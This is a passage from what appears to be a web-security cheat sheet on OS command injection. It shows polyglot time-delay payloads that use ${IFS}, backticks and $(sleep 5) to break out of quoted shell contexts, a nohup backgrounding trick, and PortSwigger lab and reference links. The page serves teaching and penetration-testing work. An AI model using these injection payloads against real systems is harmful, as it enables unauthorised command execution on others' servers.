<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>echo &quot;1;sleep${IFS}9;#${IFS}&#39;;sleep${IFS}9;#${IFS}&quot;;sleep${IFS}9;#${IFS}
</code></pre></div></li>
<li>Example 2: 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-&#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&#39;&quot;||sleep(5)||&quot;/*`*/
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a># Context inside commands with single and double quote:
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-&#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&#39;&quot;||sleep(5)||&quot;/*`*/
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>echo &quot;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-&#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&#39;&quot;||sleep(5)||&quot;/*`*/&quot;
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>echo &#39;YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-&#39;/*$(sleep 5)`sleep 5` #*/-sleep(5)||&#39;&quot;||sleep(5)||&quot;/*`*/&#39;
</code></pre></div></li>
</ul>
<h2 id="tricks">Tricks</h2>
<h3 id="backgrounding-long-running-commands">Backgrounding long running commands</h3>
<p>In some instances, you might have a long running command that gets killed by the process injecting it timing out.
Using <code>nohup</code>, you can keep the process running after the parent process exits.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>nohup<span class="w"> </span>sleep<span class="w"> </span><span class="m">120</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="p">&amp;</span>
</code></pre></div>
<h3 id="remove-arguments-after-the-injection">Remove arguments after the injection</h3>
<p>In Unix-like command-line interfaces, the <code>--</code> symbol is used to signify the end of command options. After <code>--</code>, all arguments are treated as filenames and arguments, and not as options.</p>
<h2 id="labs">Labs</h2>
<ul>
<li><a href="https://portswigger.net/web-security/os-command-injection/lab-simple">OS command injection, simple case</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays">Blind OS command injection with time delays</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection">Blind OS command injection with output redirection</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band">Blind OS command injection with out-of-band interaction</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration">Blind OS command injection with out-of-band data exfiltration</a></li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/">SECURITY CAF - Exploiting Timed Based RCE</a></li>
<li><a href="https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136">Bug Bounty Survey - Windows RCE spaceless</a></li>
<li><a href="https://twitter.com/asdizzle_/status/895244943526170628">No PHP, no spaces, no $, no { }, bash only - @asdizzle</a></li>
<li><a href="https://twitter.com/DissectMalware/status/1025604382644232192">#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware</a></li>
<li><a href="https://portswigger.net/web-security/os-command-injection">What is OS command injection - portswigger</a></li>
<li><a href="https://sonarsource.github.io/argument-injection-vectors/">Argument Injection Vectors - Sonar</a></li>
</ul>












                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/madmd5" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/michael-davis-973625b1/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "navigation.top", "toc.integrate", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotate", "content.code.copy"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.1e8ae164.min.js"></script>
      
    
  </body>
</html>